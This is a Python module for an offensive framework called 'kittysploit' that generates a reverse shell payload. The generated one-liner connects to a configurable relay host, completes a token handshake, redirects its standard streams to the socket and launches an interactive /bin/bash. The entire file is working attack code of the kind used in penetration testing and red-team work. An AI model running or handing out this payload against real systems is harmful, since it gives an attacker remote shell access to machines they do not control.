#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *


class Module(Payload):

    CLIENT_LANGUAGE = "python"

    __info__ = {
        "name": "Unix Command Shell, P2P Relay (via Python)",
        "description": (
            "Connect to a P2P relay hub as AGENT and spawn an interactive shell "
            "once an operator joins the same token room."
        ),
        "category": PayloadCategory.CMD,
        "arch": Arch.PYTHON,
        "platform": Platform.UNIX,
        "listener": "listeners/multi/p2p_relay",
        "handler": Handler.REVERSE,
        "session_type": SessionType.SHELL,
    }

    relay_host = OptString("127.0.0.1", "Relay hub IP or hostname", True)
    relay_port = OptPort(9000, "Relay hub port", True)
    relay_token = OptString("kitty-room", "Shared room token (must match operator)", True)
    shell_binary = OptString("/bin/bash", "System shell binary", True)
    python_binary = OptString("python3", "Python interpreter", True)

    def _build_script(self) -> str:
        host = str(self.relay_host)
        port = int(self.relay_port)
        token = str(self.relay_token).replace("\\", "\\\\").replace("'", "\\'")
        shell = str(self.shell_binary).replace("\\", "\\\\").replace("'", "\\'")
        return (
            "import socket,subprocess,os\n"
            f"host='{host}'\n"
            f"port={port}\n"
            f"token='{token}'\n"
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
            "s.connect((host,port))\n"
            "s.sendall(f'KSRL:v1:AGENT:{token}\\n'.encode())\n"
            "buf=b''\n"
            "while b'\\n' not in buf:\n"
            "    chunk=s.recv(1)\n"
            "    if not chunk: raise SystemExit('relay handshake failed')\n"
            "    buf+=chunk\n"
            "if not buf.decode().startswith('KSRL:OK'):\n"
            "    raise SystemExit('relay rejected handshake')\n"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)\n"
            f"subprocess.call(['{shell}','-i'])\n"
        )

    def generate(self):
        script = self._build_script()
        py = str(self.python_binary)
        return f"{py} -c {repr(script)}"
